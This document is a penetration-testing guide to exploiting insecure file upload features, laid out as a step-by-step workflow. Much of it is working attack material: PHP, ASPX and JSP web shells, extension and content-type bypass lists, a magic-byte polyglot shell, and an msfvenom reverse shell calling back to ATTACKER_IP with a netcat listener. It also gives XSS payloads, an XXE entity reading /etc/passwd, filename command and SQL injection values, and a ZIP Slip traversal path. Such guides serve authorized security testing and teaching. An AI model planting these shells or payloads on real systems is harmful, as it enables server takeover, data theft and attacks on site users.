# Insecure File Upload

## Why It Matters

File upload flaws are valuable because they often bridge the gap between a normal web issue and direct code execution. But the path depends on what the application actually does with the file.

Possible impacts include:

- arbitrary file upload
- server-side code execution
- stored XSS through uploaded content
- XXE through SVG or office-style parsing
- path traversal during archive extraction
- denial of service

## Workflow

1. understand where the file lands and how it is used
2. test whether server-side validation exists
3. identify backend language and execution rules
4. choose the lightest bypass that matches the filter
5. verify execution or alternate impact

## Step 1: Understand The Upload Path

Before brute forcing extensions, answer:

- is the file stored locally or externally?
- is it renamed?
- is it publicly reachable?
- is it rendered back to users?
- is it parsed, resized, extracted, or scanned?

Useful checks:

- duplicate filename behavior
- response messages and IDs
- predictable paths such as `/uploads/`, `/images/`, `/files/`

## Step 2: Baseline Test

Start simple.

```bash
echo '<?php echo "TEST"; ?>' > test.php
```

Upload it and try likely retrieval paths:

```text
/uploads/test.php
/images/test.php
/files/test.php
```

If it executes, you have arbitrary upload with immediate code execution.

## Step 3: Identify Backend Technology

Use surrounding application clues:

```text
/index.php
/index.jsp
/index.asp
/index.aspx
```

If needed, confirm with headers, stack traces, or fingerprinting tools. Match the payload to the backend, not your preference.

## Step 4: Test Validation Logic

You are trying to learn whether the app blocks based on:

- extension
- MIME type
- magic bytes
- filename pattern
- image processing behavior
- archive extraction

## Common Exploitation Paths

### 1. No Real Validation

If the server accepts executable files directly, keep it minimal:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Then test:

```text
/uploads/shell.php?cmd=id
```

### 2. Blacklist Bypass

If common extensions are blocked but server-side execution is still possible, test alternate forms:

```text
shell.pHp
shell.phtml
shell.php5
shell.phar
shell.inc
```

This works when the filter is incomplete but the server still treats the file as executable.

### 3. Whitelist Or Regex Bypass

Weak validation often falls to filename tricks:

```text
shell.jpg.php
shell.php.jpg
shell.php%00.jpg
shell.php%20.jpg
shell.php%0a.jpg
shell.php:.jpg
shell.php/.jpg
```

These only matter when the backend, filesystem, or server parser mishandles the filename.

### 4. Content-Type Bypass

If the app trusts multipart metadata:

```text
Content-Type: image/jpeg
```

Change the file part header, not just the main request header.

### 5. Magic Byte Bypass

If the app inspects file signatures:

```bash
printf "GIF89a\n<?php system($_GET['cmd']); ?>" > shell.php
```

This can work when validation checks the opening bytes but execution still depends on the final extension or handler.

## Language-Specific Payload Examples

### PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

### ASPX

```aspx
<%@ Page Language="C#" %><%Response.Write(Request.QueryString["cmd"]);%>
```

### JSP

```jsp
<% out.println(request.getParameter("cmd")); %>
```

## Reverse Shell Escalation

Only move from command execution to a reverse shell when needed.

```bash
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f raw > reverse.php
nc -lvnp ATTACKER_PORT
```

Then trigger the uploaded file.

## Alternate Non-RCE Impacts

If code execution is not possible, the upload feature may still be exploitable.

### Stored XSS In SVG Or Metadata

```bash
exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
```

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>
```

### XXE Through SVG

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### File Name Injection

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
<script>alert(1)</script>.jpg
file';select sleep(5);--.jpg
```

This matters if the application later uses the filename in shell commands, HTML output, or SQL queries.

## Archive Uploads

### ZIP Extraction Checks

```bash
echo "test" > test.txt
zip test.zip test.txt
```

Ask:

- is the archive extracted automatically?
- where are files extracted?
- are paths predictable?

### ZIP Slip

If archive extraction is unsafe, path traversal inside the archive may escape the intended directory.

```text
../../../../var/www/html/shell.php
```

This is high impact when the application extracts archives as a privileged user or into web-reachable paths.

## Denial Of Service Paths

Even if execution fails, uploads may still allow:

- oversized file storage exhaustion
- ZIP bombs
- image parsing memory pressure

## Pitfalls

- assuming upload success equals code execution
- using PHP payloads against non-PHP backends
- ignoring the retrieval path and storage location
- missing client-side-only validation
- failing to test alternate impacts when RCE is blocked

## Reporting Notes

Capture:

- the upload endpoint
- the validation weakness
- the exact filename or header manipulation used
- where the file was stored
- whether the impact was RCE, XSS, XXE, traversal, or DoS

## Fast Checklist

```text
1. Learn where the file goes
2. Test direct executable upload
3. Identify the filter type
4. Match bypass to validation logic
5. Prove execution or alternate impact
6. Save upload and retrieval evidence
```
